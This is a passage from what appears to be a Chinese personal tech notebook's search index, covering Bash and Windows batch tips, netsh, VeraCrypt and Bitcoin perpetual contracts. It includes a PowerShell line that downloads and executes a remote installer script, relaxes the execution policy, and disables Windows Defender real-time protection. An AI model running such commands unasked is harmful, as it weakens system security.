upgrade\u81ea\u52a8\u5173\u95ed\u7684\u95ee\u9898</li> <li>NULL\u8f6c0</li> <li>\u7ed9MySQL\u589e\u52a0\u4e00\u4e2aslave\u505a\u4e3b\u4ece\u590d\u5236</li> </ul>"},{"location":"#nginx","title":"Nginx","text":"<ul> <li>Nginx\u601d\u8003\u9898</li> <li>\u666e\u901a\u8d44\u6e90\u5141\u8bb8POST</li> <li>\u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u5f53\u6210php\u6267\u884c</li> <li>\u83b7\u5f97Let\u2019s encrypt\u514d\u8d39https\u8bc1\u4e66</li> <li>\u4f7f\u7528acme.sh\u83b7\u5f97\u6cdb\u57df\u540d\u8bc1\u4e66</li> <li>\u914d\u7f6e\u5b89\u5168\u7684https</li> <li>\u53cd\u5411\u4ee3\u7406\u4e4b\u66ff\u6362\u7f51\u9875\u3001JS\u4e2d\u7684\u6587\u672c</li> <li>root\u4e0ealias\u7684\u533a\u522b</li> <li>\u5728bash on win10\u4e0a\u4f7f\u7528Nginx</li> <li>Nginx\u5141\u8bb8\u5217\u76ee\u5f55</li> <li>\u5b89\u5168\u5730\u4f7f\u7528SeaweedFS\u4f5c\u4e3a\u56fe\u7247\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668: \u591a\u4e0a\u6e38\u5207\u6362\uff0cSeaweedFS Docker\u90e8\u7f72</li> <li>proxy_pass \u52a8\u6001\u4ee3\u7406</li> <li>\u4f7f\u7528\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u5b9a\u65f6\u66f4\u65b0https\u8bc1\u4e66</li> <li>\u4f7f\u7528nfs\u5b58\u50a8Nginx\u65e5\u5fd7</li> </ul>"},{"location":"#php","title":"PHP","text":"<ul> <li>\u663e\u793a\u9519\u8bef\u4fe1\u606f</li> <li>\u5168\u9875\u9762iframe</li> </ul>"},{"location":"#rabbitmq","title":"RabbitMQ","text":"<ul> <li>\u4f7f\u7528Docker\u90e8\u7f72</li> <li>\u4efb\u52a1\u63a8\u9001\u6267\u884c \u4ee3\u7801\u793a\u4f8b</li> </ul>"},{"location":"#ubuntu","title":"Ubuntu\u684c\u9762\u7248","text":"<ul> <li>\u5b89\u88c5Google\u62fc\u97f3\u540e\u7528\u4e0a\u4e91\u5019\u9009\u529f\u80fd</li> </ul>"},{"location":"#virtualbox","title":"VirtualBox","text":"<ul> <li>\u4e0b\u8f7d\u5b89\u88c5\uff0c\u4e00\u5b9a\u8bb0\u5f97\u5b89\u88c5\u989d\u5916\u5305</li> <li>\u521b\u5efa\u865a\u62df\u673a\uff0c\u8bbe\u7f6e\u865a\u62df\u673a\u9009\u9879</li> <li>\u542f\u52a8\u865a\u62df\u673a</li> <li>\u8fdc\u7a0b\u63a7\u5236\u865a\u62df\u673a</li> </ul>"},{"location":"#winsoftware","title":"WinSoftware","text":"<ul> <li>Emeditor</li> <li>Everything</li> <li>Sysinternals Utilities</li> <li>CLOC\u4ee3\u7801\u7edf\u8ba1\u5229\u5668</li> <li>U\u76d8\u5b89\u88c5\u539f\u7248\u7cfb\u7edf\u76d8</li> <li>WinRAR</li> <li>BurpSuite</li> <li>BEncode Editor</li> <li>Win10 Windows\u7167\u7247\u67e5\u770b\u5668</li> </ul>"},{"location":"BASH/","title":"BASH","text":""},{"location":"BASH/#bashalias","title":"\u5728bash\u811a\u672c\u4e2d\u4f7f\u7528alias","text":"<p>@TAG alias</p> <p>\u52a0\u4e0a\u8fd9\u4e48\u4e00\u53e5\uff1a</p> <pre><code>shopt -s expand_aliases\n</code></pre>"},{"location":"BASH/#_1","title":"\u5224\u65ad\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u4e3a\u7a7a","text":"<p>\u5728python\u91cc\u53ef\u4ee5\u7528len(sys.argv)\u5224\u65ad\u53c2\u6570\u4e2a\u6570\uff0cbash\u91cc\u7528\u4e2d\u62ec\u53f7\u91cc\u7684-z</p> <pre><code>if [ -z \"$1\" ] &amp;&amp; [ -z \"$2\" ]; then\necho \"Usage: $0 &lt;parameter1&gt; &lt;parameter2&gt;\"\nfi\n</code></pre>"},{"location":"BASH/#forseq","title":"for\u5faa\u73af\u7528seq\u751f\u6210\u6570\u5b57\u5217\u8868","text":"<p>@TAG seq</p> <p>\u6ce8\u610f\u7ec8\u70b9\u662f\u5305\u542b\u5728\u5185\u7684\uff0c\u4e0d\u540c\u4e8ePython\u7684range</p> <ul> <li><code>seq 3</code>: 1 2 3</li> <li><code>seq 2 3</code>: 2 3</li> <li><code>seq 1 2 5</code>: 1 3 5</li> </ul> <pre><code>for i in $(seq 1 $END); do echo $i; done\n</code></pre>"},{"location":"BASH/#bash_1","title":"BASH\u505a\u4e0d\u540c\u8fdb\u5236\u95f4\u6570\u5b66\u8ba1\u7b97","text":"<p>\u4e0d\u9700\u8981bc\u4e5f\u53ef\u4ee5\u76f4\u63a5\u505a\u8ba1\u7b97\uff0c\u4f8b\u5982\u8ba1\u7b975+0xa+0b1010</p> <pre><code>echo $((5+16#a+2#1010))\n</code></pre>"},{"location":"BASH/#apt","title":"\u5224\u65ad\u547d\u4ee4\u4e0d\u5b58\u5728\u518dapt\u5b89\u88c5","text":"<pre><code>command -v aria2c &gt;/dev/null 2&gt;&amp;1 || { apt update &amp;&amp; apt install -y aria2; }\n</code></pre> <p>\u5982\u679c\u6709\u591a\u4e2a\u8f6f\u4ef6\u53ef\u80fd\u8981\u5b89\u88c5\uff0c\u6ca1\u5fc5\u8981\u6bcf\u6b21\u90fdapt update\uff0c\u53ef\u4ee5\u5148\u88c5\u4e86\u518d\u8bf4 \u5931\u8d25\u5c31apt update</p> <pre><code>command -v 7z &gt;/dev/null 2&gt;&amp;1 || { apt-get install -y p7zip; }\ncommand -v 7z &gt;/dev/null 2&gt;&amp;1 || { apt update;  apt-get install -y p7zip; }\n</code></pre>"},{"location":"BASH/#_2","title":"\u5224\u65ad\u6587\u4ef6\u4e0d\u5b58\u5728","text":"<p>\u6ce8\u610f<code>]</code>\u524d\u9762\u8981\u6709\u7a7a\u683c</p> <pre><code>if [ ! -f \"somefile\" ]; then\ncurl ...\nfi\n</code></pre>"},{"location":"BASH/#sort","title":"sort\u6392\u5e8f","text":"<p>\u9006\u5e8f -r \u6309\u7248\u672c\u6392\u5e8f \u6392\u5e8fIP\u5730\u5740 -V \u6309\u6570\u5b57\u6392\u5e8f -n \u6309\u4eba\u7c7b\u7406\u89e3\u7684\u6587\u4ef6\u5927\u5c0f\u6392\u5e8f -h \u6307\u5b9a\u67d0\u4e9b\u5217\u6765\u6392\u5e8f -k 3,3 -k 4,4 \u6307\u5b9a\u5206\u9694\u7b26\u7528-t \u2018.\u2019</p> <p>\u53c2\u8003\uff1a https://www.madboa.com/geek/sort-addr/</p>"},{"location":"BASH/#rsync","title":"rsync\u79fb\u52a8\u8fdc\u7a0b\u76ee\u5f55\u7279\u5b9a\u6587\u4ef6\u81f3\u672c\u673a\u540e\u5faa\u73af\u64cd\u4f5c","text":"<p>rsync\u6709<code>--dry-run</code>\u53c2\u6570\u786e\u8ba4\u6ca1\u51fa\u9519\u540e\u518d\u64cd\u4f5c</p> <pre><code>rsync -P --remove-source-files -avz '1.2.3.4:/root/dockerimages/*.tar.7z' ./\n\nfor filename in *.tar.7z; do 7z x -so $filename | docker load; mv $filename ./done/; done\n</code></pre>"},{"location":"BAT/","title":"BAT \u6279\u5904\u7406","text":"<p>\u4e5f\u5305\u542b\u4e00\u4e9bWindows\u547d\u4ee4\u884c\u5de5\u5177</p>"},{"location":"BAT/#cmd","title":"\u5feb\u901f\u6253\u5f00cmd","text":"<p>\u8fd8\u5728\u7528Win+R cmd\u518d\u7528pushd\u547d\u4ee4\uff1f</p> <p>\u5728\u8d44\u6e90\u7ba1\u7406\u5668\u7684\u5730\u5740\u680f\u8f93\u5165cmd\u56de\u8f66\u5c31\u80fd\u76f4\u63a5\u8fdb\u5165\u5f53\u524d\u76ee\u5f55</p> <p>\u53e6\u5916\uff0c\u4e0d\u5982\u76f4\u63a5\u628acmd\u52a0\u5165\u5230\u9f20\u6807\u53f3\u952e</p>"},{"location":"BAT/#_1","title":"\u5e76\u5217\u8bed\u53e5\u8bed\u6cd5","text":"<pre><code>\u987a\u5e8f\u6267\u884c &amp;\necho a &amp; echo b \n\n\u524d\u8005\u6b63\u786e\u624d\u6267\u884c &amp;&amp;\n&gt;nul 2&gt;nul ping -n 1 qq.com &amp;&amp; echo network ok\n\n\u524d\u8005\u9519\u8bef\u624d\u6267\u884c ||\n&gt;nul 2&gt;nul ping -n 1 qq.com || echo network failure\n</code></pre>"},{"location":"BAT/#for","title":"\u6765\u4e00\u4e2a\u6b7b\u5faa\u73af\u5427 for","text":"<p>\u7528\u4e8e\u7ed3\u675f\u8fdb\u7a0b\uff0c\u6216\u8005DNS\u67e5\u8be2\u770b\u770b\u89e3\u6790\u662f\u5426\u751f\u6548</p> <pre><code>for /l %i in (1,1,9999999) do ...\n</code></pre>"},{"location":"BAT/#taskkill","title":"\u7ed3\u675f\u8fdb\u7a0b taskkill","text":"<p>\u5f53\u542f\u52a8cmd\u7a97\u53e3\u8fc7\u591a\u7684\u65f6\u5019\uff0c\u4f7f\u7528taskkill\u6279\u91cf\u5173\u95ed</p> <pre><code>taskkill /f /im cmd.exe\n</code></pre> <p>\u7c7b\u4f3c\u7684Linux\u547d\u4ee4\u4e3a<code>killall bash</code></p>"},{"location":"BAT/#free","title":"\u5185\u5b58\u6574\u7406 free","text":"<p>\u5fae\u8f6f\u81ea\u5df1\u51fa\u7684\u4e00\u4e2a\u5185\u5b58\u6574\u7406\u5de5\u5177\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650</p> <p>\u4e0b\u8f7d\uff1aempty.exe</p> <pre><code>empty *\n</code></pre>"},{"location":"BAT/#sleepx","title":"\u7761\u4e00\u4f1a SleepX","text":"<p>\u7a0b\u5e8f\u9700\u8981\u7b49\u5f85\u4e00\u5b9a\u65f6\u95f4\u518d\u7ee7\u7eed\u8fd0\u884c\u5c31\u53ef\u4ee5sleepx\u5566\uff0c\u4f5c\u8005Bill Stewart (bstewart@iname.com)</p> <p>\u4e0b\u8f7d\uff1aSleepX.exe</p> <pre><code>SleepX 10\n</code></pre> <p>\u7b49\u5f855s\uff0c\u5982\u679c\u7528\u6237\u7b49\u4e0d\u53ca\u53ef\u4ee5\u6309\u952e\uff0c\u6b64\u65f6 not \u201c%errorlevel%\u201d == \u201c0\u201d</p> <pre><code>SleepX -k 5\n</code></pre>"},{"location":"BAT/#curl","title":"\u547d\u4ee4\u884c\u7684\u6d4f\u89c8\u5668 curl","text":"<p>\u5927\u540d\u9f0e\u9f0e\u7684cURL\uff0c\u4e0d\u5fc5\u591a\u8a00\uff1b\u53ea\u662f\u5b83\u7684\u547d\u4ee4\u884c\u7684\u8fd0\u884c\u65b9\u5f0f\u4e0elibcurl\u7528\u8d77\u6765\u5dee\u5f02\u5f88\u5927\uff08\u5982\u6bd4\u8f83php\u7684curl\u7528\u6cd5\uff09</p> <p>\u5b98\u65b9\uff1ahttps://curl.haxx.se/</p> <p>\u7b80\u5355\u5165\u95e8\uff1ahttp://www.bathome.net/thread-1761-1-1.html</p> <p>\u5c06curl\u8f6c\u4e3apython requests http://curl.trillworks.com/</p> <p>\u4e0b\u8f7d7.51 x64\u7248\u672c</p> <p>\u5177\u4f53\u8bf7\u89c1\u5355\u72ec\u6587\u6863cURL.md</p>"},{"location":"BAT/#_2","title":"\u5224\u65ad\u6587\u4ef6\u5939\u5b58\u5728","text":"<p>\u901a\u8fc7\u5224\u65adnul\u8fd9\u4e2a\u7279\u6b8a\u6587\u4ef6\u7684\u5b58\u5728\u6027\uff08\u7528\u6237\u5e76\u4e0d\u80fd\u521b\u5efa\u6587\u4ef6\u540d\u5f62\u5982nul\u7684\u7279\u6b8a\u6587\u4ef6\uff09</p> <pre><code>if exist DIRNAME\\nul echo Yes!\n</code></pre>"},{"location":"BAT/#mklinkfsutil-hardlink-create","title":"\u521b\u5efa\u786c\u94fe\u63a5mklink\u6216\u8005fsutil hardlink create","text":"<p>Win7\u53ca\u4ee5\u4e0a\uff1a</p> <pre><code>mklink /H Link Target\n</code></pre> <p>\u76ee\u5f55\u8fd8\u9700\u8981/J</p> <pre><code>mklink /H /J Link Target\n</code></pre> <p>WinXP\u53ea\u80fd\u7528\uff1a</p> <pre><code>fsutil hardlink create &lt;new filename&gt; &lt;existing filename&gt;\n</code></pre>"},{"location":"BAT/#_3","title":"\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u6b64\u547d\u4ee4\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650</p> <pre><code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=\u8f6c\u53d1\u51fa\u7684\u7aef\u53e3 connectaddress=\u8f6c\u53d1\u7684\u6e90IP\u5730\u5740 connectport=\u8f6c\u53d1\u7684\u6e90\u7aef\u53e3\n</code></pre>"},{"location":"BAT/#rvpn","title":"\u4fdd\u6301RVPN\u4e0d\u65ad\u5f00","text":"<p>rvpn\u4f1a\u81ea\u52a8\u65ad\u5f00\uff0c\u6240\u4ee5\u5199\u4e86\u4e2a\u811a\u672c\u5224\u65ad\u5e76\u81ea\u52a8\u91cd\u8fde</p> <p>RVPNKeepAlive.bat</p> <p>\u5176\u4e2d\u7684\u77e5\u8bc6\u70b9\uff1a</p> <ol> <li> <p>\u5224\u65ad\u547d\u4ee4\u662f\u5426\u6210\u529f\u7528if \u201c%errorlevel%\u201d==\u201d0\u201d\uff0cerrorlevel\u8fd9\u4e2a\u53d8\u91cf\u662f\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u8fd4\u56de\u7ed3\u679c\uff08C\u7a0b\u5e8f\u7684int main\u7684\u8fd4\u56de\u503c\uff09\uff0c\u4e00\u822c\u89c4\u5b9a\u8fd4\u56de0\u8868\u793a\u6ca1\u6709\u53d1\u751f\u9519\u8bef</p> </li> <li> <p>\u7528ping www.baidu.com\u548cping -n 2 ip.cn\u505a\u7c97\u7cd9\u7684\u7b49\u5f85\u5ef6\u65f6\uff0c\u5176\u4e2d-n\u8868\u793aping\u7684\u6b21\u6570\uff0c\u9ed8\u8ba4\u662f4\uff0c\u6539\u5c0f\u4e00\u70b9\u5c31\u662f\u66f4\u77ed\u7684\u5ef6\u65f6\u54af</p> </li> <li> <p>\u542f\u52a8\u4e00\u4e2aGUI\u7684exe\uff0c\u9700\u8981\u7528start \u201c\u201d example.exe</p> </li> </ol>"},{"location":"BAT/#vpn","title":"\u6d59\u6c5f\u5927\u5b66\u6709\u7ebfvpn\u9759\u6001\u8def\u7531\u914d\u7f6e\u811a\u672c","text":"<p>Author: shuishui</p> <p>\u9759\u6001\u8def\u7531\u8bbe\u7f6e.bat</p>"},{"location":"BAT/#_4","title":"\u8fdb\u5165\u4f11\u7720","text":"<p>Win10\u4f3c\u4e4e\u6ca1\u6709\u4ece\u9f20\u6807\u8fdb\u5165\u4f11\u7720\u800c\u4e0d\u662f\u7761\u7720\u7684\u65b9\u6cd5\uff0c\u4f46\u8c03\u7528rundll32\u8fdb\u5165\u4f11\u7720\u6a21\u5f0f\u8fd8\u662f\u53ef\u4ee5\u7684\uff1a</p> <pre><code>rundll32.exe powrProf.dll,SetSuspendState\n</code></pre>"},{"location":"BAT/#_5","title":"\u5feb\u901f\u8fdb\u5165\u7cfb\u7edf\u4ee3\u7406\u8bbe\u7f6e","text":"<p>@TAG \u4ee3\u7406</p> <p>From: https://stackoverflow.com/questions/3648366/is-it-possible-to-launch-ies-proxy-settings-dialog-from-the-command-line</p> <p>\u4e0d\u7528\u542f\u52a8<code>c:\\Program Files\\Internet Explorer\\iexplore.exe</code>\uff0c\u76f4\u63a5Win+R\u8f93\u5165\u8fd9\u4e2a\u5c31\u80fd\u6253\u5f00IE\u7684\u8fde\u63a5\u8bbe\u7f6e\uff0c\u65b9\u4fbf\u4fee\u6539\u4ee3\u7406\uff1a</p> <pre><code>inetcpl.cpl ,4\n</code></pre>"},{"location":"BAT/#cmd_1","title":"\u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650","text":"<p>\u6bd4\u5982\u4e0b\u6587\u7684\u4fee\u6539ip\u7b49\u64cd\u4f5c\u5c31\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4f60\u53ef\u4ee5\u5148\u542f\u52a8\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u518d\u8fd0\u884c\u4e00\u4e2a\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\uff1b\u73b0\u5728\u6709\u4e86\u66f4\u52a0\u76f4\u63a5\u7684\u64cd\u4f5c</p>"},{"location":"BAT/#1elevate","title":"\u65b9\u68481\uff1aelevate","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttp://code.kliu.org/misc/elevate/elevate-1.3.0-redist.7z</p> <p>\u7279\u70b9\uff1a\u6709UAC\u5f39\u7a97\uff0c\u4f1a\u542f\u52a8\u4e00\u4e2a\u65b0\u7a97\u53e3</p> <p>\u4f8b\u5b50\uff1a</p> <pre><code>REM \u542f\u52a8\u4e00\u4e2a\u7279\u6743\u7684cmd\nelevate -k\nREM \u6267\u884cdir\u5e76\u7b49\u5f85\u7ed3\u675f\nelevate -c -w dir\n</code></pre>"},{"location":"BAT/#2sudo-for-windows-luke-sampson","title":"\u65b9\u68482\uff1aSudo for Windows \u2013 Luke Sampson","text":"<p>\u53c2\u8003\uff1ahttps://helpdeskgeek.com/free-tools-review/5-windows-alternatives-linux-sudo-command/</p> <p>\u5728powershell\u4e2d\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u5b8c\u6210\u5b89\u88c5\uff1a</p> <pre><code>iex (new-object net.webclient).downloadstring(\u2018https://get.scoop.sh\u2019)\n\nset-executionpolicy unrestricted -s cu -f\n\nscoop install sudo\n</code></pre> <p>\u7279\u70b9\uff1a\u6bd4\u8f83\u6162\uff0c\u4ecd\u7136\u6709UAC\u5f39\u7a97\uff0c\u4e0d\u4f1a\u542f\u52a8\u4e00\u4e2a\u65b0\u7a97\u53e3</p>"},{"location":"BAT/#ip","title":"\u547d\u4ee4\u884c\u914d\u7f6eIP","text":"<p>\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u53c2\u89c1\u4e0a\u65b9<code>\u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650</code></p> <p>\u53c2\u8003\uff1ahttps://helpdeskgeek.com/networking/change-ip-address-and-dns-servers-using-the-command-prompt/</p> <p>\u9996\u5148\u4f7f\u7528<code>netsh interface ip show config</code>\u67e5\u770b\u9002\u914d\u5668\u7684\u540d\u79f0\uff0c\u5047\u8bbe\u9700\u8981\u914d\u7f6e\u7684\u662f<code>\u4ee5\u592a\u7f51</code></p>"},{"location":"BAT/#ipdns","title":"\u914d\u7f6e\u9759\u6001IP\u548cDNS","text":"<pre><code>netsh interface ip set address name=\"\u4ee5\u592a\u7f51\" static 192.168.1.101 255.255.255.0 192.168.1.1\nnetsh interface ip set dns \"\u4ee5\u592a\u7f51\" static 192.168.1.1\n</code></pre>"},{"location":"BAT/#dhcp","title":"\u914d\u7f6eDHCP","text":"<pre><code>netsh interface ip set address name=\"\u4ee5\u592a\u7f51\" dhcp\nnetsh interface ip set dns \"\u4ee5\u592a\u7f51\" dhcp\n</code></pre>"},{"location":"BAT/#veracrypt","title":"\u547d\u4ee4\u884c\u4f7f\u7528VeraCrypt","text":"<p>VeraCrypt\u662fTrueCrypt\u4ee3\u66ff\u8005\uff0c\u5176\u547d\u4ee4\u884c\u4f7f\u7528\u65b9\u5f0f\uff1a https://www.veracrypt.fr/en/Command%20Line%20Usage.html</p> <p>\u4e0b\u8f7dPortable\u7248\u672c\u5373\u53ef\uff0c\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.veracrypt.fr/en/Downloads.html</p>"},{"location":"BAT/#_6","title":"\u521b\u5efa\u4e00\u4e2a\u52a0\u5bc6\u76d8","text":"<p>\u4e0d\u4e0e\u7528\u6237\u4ea4\u4e92\u6240\u4ee5\u6307\u5b9a<code>/q /s</code>\uff0c\u5177\u4f53\u6765\u8bf4/q\u8868\u793a\u4e0d\u663e\u793a\u4e3b\u7a97\u53e3\uff0c/s\u8868\u793a\u4e0d\u663e\u793a\u4efb\u4f55\u4ea4\u4e92\u7a97\u53e3\u4e5f\u4e0d\u62a5\u9519\uff0c\u6ce8\u610f\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53c2\u6570\u540e\u5373\u4f7f\u51fa\u9519\u4e5f\u4e0d\u4f1a\u6709\u4efb\u4f55\u63d0\u9192</p> <p>\u6587\u4ef6\u540dtest.hc\uff0c\u5927\u5c0f100M\uff0c\u5bc6\u7801\u5fc5\u987b20\u4e2a\u5b57\u7b26\u6216\u4ee5\u4e0a\uff0c\u52a0\u5bc6\u65b9\u5f0f\u4f7f\u7528\u6700\u5feb\u7684Serpent\uff0c\u4e3a\u4e86\u52a0\u901f\u6302\u8f7d\u8fc7\u7a0b\u6307\u5b9a/pim 1</p> <pre><code>\"VeraCrypt Format.exe\" /create test.hc /password testtesttesttesttest /hash sha512 /encryption serpent /filesystem FAT /size 100M /pim 1 /force /silent\n</code></pre> <p>\u5982\u679c\u4e0d\u6307\u5b9a/pim\u6765\u964d\u4f4e\u8fed\u4ee3\u6b21\u6570\uff0c\u6302\u8f7d\u65f6\u9700\u8981\u8017\u65f6\u5341\u79d2\u4ee5\u4e0a\u65e0\u6cd5\u63a5\u53d7\uff0c\u6240\u4ee5\u727a\u7272\u4e00\u70b9\u5b89\u5168\u6027\u6765\u6362\u53d6\u6027\u80fd\u3002\u5173\u4e8ePIM\u7684\u6587\u6863\uff1a https://www.veracrypt.fr/en/Personal%20Iterations%20Multiplier%20(PIM).html</p>"},{"location":"BAT/#_7","title":"\u6302\u8f7d\u52a0\u5bc6\u76d8","text":"<p>\u6302\u8f7dtest.hc\u81f3Z:\u76d8\uff0c\u9700\u8981\u6307\u5b9a\u4e0e\u521b\u5efa\u8fc7\u7a0b\u76f8\u540c\u7684/pim</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u7acb\u5373\u8fd4\u56de\uff0c\u4f46\u771f\u6b63\u6302\u8f7d\u53ef\u4ee5\u8bbf\u95eeZ\u76d8\u53ef\u80fd\u8fd8\u9700\u8981\u7b49\u5f85\u6570\u79d2</p> <pre><code>VeraCrypt.exe /quit /silent /volume test.hc /password testtesttesttesttest /pim 1 /l z\n</code></pre>"},{"location":"BAT/#_8","title":"\u5378\u8f7d\u5df2\u7ecf\u6302\u8f7d\u7684\u52a0\u5bc6\u76d8","text":"<pre><code>VeraCrypt.exe /quit /silent /dismount z\n</code></pre>"},{"location":"BAT/#windows-defender","title":"\u547d\u4ee4\u884c\u5173\u95edWindows Defender","text":"<p>\u5728\u8fdb\u884c\u5927\u91cfIO\u64cd\u4f5c\u7684\u65f6\u5019\uff08\u5982\u62f7\u8d1d\u5927\u91cf\u5c0f\u6587\u4ef6\uff09\uff0cWindows Defender\u4f1a\u4e25\u91cd\u62d6\u6162\u4efb\u52a1\u901f\u5ea6</p> <p>\u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0bpowershell\u53ef\u4ee5\u76f4\u63a5\u4e34\u65f6\u5173\u95edWindows Defender\u7684\u5b9e\u65f6\u9632\u62a4</p> <p>\u642d\u914delevate.exe\u4f7f\u7528\u5373\u53ef\u5728Win+R\u4e2d\u5feb\u901f\u5173\u95ed\uff1a</p> <pre><code>elevate powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"\n</code></pre> <p>\u8fd9\u4e2a\u4f3c\u4e4e\u5728\u6700\u65b0\u7684Windows 2004\u5df2\u7ecf\u5931\u6548</p>"},{"location":"BAT/#windowsip","title":"\u547d\u4ee4\u884c\u589e\u52a0Windows\u9632\u706b\u5899\u89c4\u5219\u963b\u65adIP","text":"<p>@TAG \u9632\u706b\u5899</p> <p>\u5f53\u7136\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\uff0c\u80fd\u4e00\u884c\u641e\u5b9a\u4f55\u5fc5\u5728\u7e41\u7410\u7684\u8bbe\u7f6e\u6b65\u9aa4\u4e2d\u5468\u65cb</p> <p>\u53c2\u8003 https://serverfault.com/questions/851922/blocking-ip-address-with-netsh-filter</p> <pre><code>netsh advfirewall firewall add rule name=\"IP Block\" ^\n   dir=in interface=any action=block remoteip=198.51.100.108/32\n</code></pre>"},{"location":"Bitcoin/","title":"Bitcoin","text":"<p>\u6211\u4e5f\u6765\u8bd5\u6c34\u5f53\u4e2a\u88ab\u5272\u7684\u97ed\u83dc\u4e86</p>"},{"location":"Bitcoin/#_1","title":"\u5957\u5229\u5b9e\u65f6\u6536\u76ca\u7387","text":"<p>\u4ee5\u4e0b\u4e3a\u5b9e\u65f6\u6536\u76ca\u7387\u6570\u636e\uff08\u6bcf\u5929\u66f4\u65b0\u4e00\u6b21\uff09\uff1aCode</p> <p>\u9884\u6d4b\u6536\u76ca\uff1a\u4e0b\u4e00\u6b21\u7ed3\u7b97\u6536\u76ca\uff08\u786e\u5b9a\u503c\uff09+\u4e0b\u4e0b\u6b21\u7ed3\u7b97\u6536\u76ca\uff08\u9884\u4f30\u503c\uff0c\u968f\u4ef7\u5dee\u6ce2\u52a8\uff09\uff0c\u5355\u4f4d\u4e3a\u5343\u5206\u4e4b</p> <p>\u6628\u65e5\u6536\u76ca\uff1a\u6700\u8fd1\u4e09\u6b21\u7ed3\u7b97\u7684\u7d2f\u8ba1\u6536\u76ca</p> <p>7\u65e5\u5e74\u5316\uff1a\u6700\u8fd121\u6b21\u7ed3\u7b97\u5e73\u5747\u6536\u76ca \u5177\u4f53\u8ba1\u7b97\u89c1\u4e0a\u6587\u8ba1\u7b97\u6536\u76ca\u7387</p> <p>\u663e\u793a\u5168\u90e8 \u5173\u6ce81 \u5173\u6ce82 \u5173\u6ce83 \u5173\u6ce84 \u706b\u5e01 \u706b\u5e01u \u5e01\u5b89 \u5e01\u5b89u OKex </p> <p>https://d.py3.io/btc.html</p>"},{"location":"Bitcoin/#_2","title":"\u671f\u8d27\u6c38\u7eed\u5408\u7ea6\u4ecb\u7ecd","text":"<p>\u4ee5\u706b\u5e01\u7684btc\u5408\u7ea6\u4e3a\u4f8b\uff0c\u4ea4\u6613\u5355\u4f4d\u6700\u5c0f\u662f\u4e00\u5f20100 USD\u7f8e\u5143\uff08\u5176\u4ed6\u5e01\u79cd\u90fd\u662f10\u7f8e\u5143\uff09</p> <p>\u4ea4\u6613\u90fd\u662f\u57fa\u4e8ebtc\u62c5\u4fdd\uff0c\u6323\u5230\u7684\u4e5f\u662fbtc</p> <p>\u4e70\u51651\u5f20\u770b\u6da8 \u505a\u591a\uff1a\u76f8\u5f53\u4e8e\u6309\u7167\u73b0\u5728\u7684\u5408\u7ea6\u4ef7\u683c\u7528100USD\u4e70\u5165btc\uff0c\u4e5f\u5c31\u662f\u501f\u5230\u4e86\u5e01\uff0c\u671f\u5f85\u6bd4\u7279\u5e01\u4ef7\u683c\u4e0a\u6da8\uff1b\u627f\u8bfa\u672a\u6765\u4f1a\u5356\u51fabtc\u5e73\u4ed3\u5f97\u5230100USD\u8fd4\u8fd8\uff0c\u5728\u5e73\u4ed3\u65f6\u5982\u679c\u771f\u7684\u6da8\u4e86\uff0c\u90a3\u65f6\u9700\u8981\u5356\u51fa\u7684btc\u5c31\u6bd4\u5f53\u65f6\u5f00\u4ed3\u65f6\u7684\u6570\u91cf\u5c11\uff0c\u8fd9\u4e2a\u5dee\u5f02\u7684\u90e8\u5206\u5c31\u662f\u6323\u5230\u7684btc\uff1b\u5982\u679cbtc\u4ef7\u683c\u4e00\u76f4\u4e0b\u8dcc\uff0c\u8d26\u6237\u91cc\u6240\u6709\u7684btc\u5356\u51fa\u90fd\u4e0d\u591f100USD\u5c31\u7206\u4ed3\u4e86\uff08\u5b9e\u9645\u7206\u4ed3\u89c4\u5219\u66f4\u590d\u6742\uff09</p> <p>\u5356\u51fa1\u5f20\u770b\u8dcc \u505a\u7a7a\uff1a\u76f8\u5f53\u4e8e\u6309\u7167\u73b0\u5728\u7684\u5408\u7ea6\u4ef7\u683c\u5356\u51fabtc\u624b\u4e0a\u62ff\u7740100USD\uff0c\u4e5f\u5c31\u662f\u501f\u5230\u4e86\u7f8e\u5143\uff08\u7136\u800c\u5e76\u4e0d\u80fd\u62ff\u5230\u7f8e\u5143\uff09\uff0c\u627f\u8bfa\u672a\u6765\u4f1a\u628a\u8fd9100\u7f8e\u5143\u4e70\u56debtc\uff0c\u5982\u679c\u6309\u9884\u671f\u771f\u7684\u8dcc\u4e86\u5e73\u4ed3\u65f6\u5c31\u80fd\u4e70\u5230\u66f4\u591a\u7684btc\u3002\u6ce8\u610f\u5230\u4e70\u5356\u8fd9\u4e2a\u671f\u8d27\u90fd\u662f\u57fa\u4e8ebtc\u62c5\u4fdd\u7684\uff0c\u6240\u4ee5\u5982\u679c\u4e0d\u52a0\u6760\u6746\u505a\u7a7a\uff0c\u5c31\u5b8c\u5168\u7b49\u4ef7\u4e8e\u5356\u51fa\u6301\u6709\u7684btc\uff0c\u4e0d\u5b58\u5728\u7206\u4ed3\u98ce\u9669\uff0c\u4e5f\u5c31\u662f\u8bf4\u60f3\u771f\u6b63\u505a\u7a7a\uff08\u82b1\u4eba\u6c11\u5e01\u8d4cbtc\u8dcc\uff09\u5fc5\u987b\u4e0a\u6760\u6746</p>"},{"location":"Bitcoin/#_3","title":"\u6c38\u7eed\u5408\u7ea6\u8d44\u91d1\u8d39\u7387\u5957\u5229"